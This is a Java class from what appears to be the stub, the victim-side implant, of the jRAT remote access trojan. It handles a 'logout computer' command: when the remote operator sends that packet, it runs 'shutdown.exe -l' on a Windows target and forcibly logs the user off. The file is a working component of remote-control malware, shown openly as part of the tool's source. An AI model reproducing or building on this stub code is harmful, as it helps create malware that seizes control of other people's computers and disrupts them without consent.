package io.jrat.stub.packets.incoming;

import io.jrat.common.OperatingSystem;

public class Packet30LogoutComputer extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
			Runtime.getRuntime().exec("shutdown.exe -l");
		}
	}

}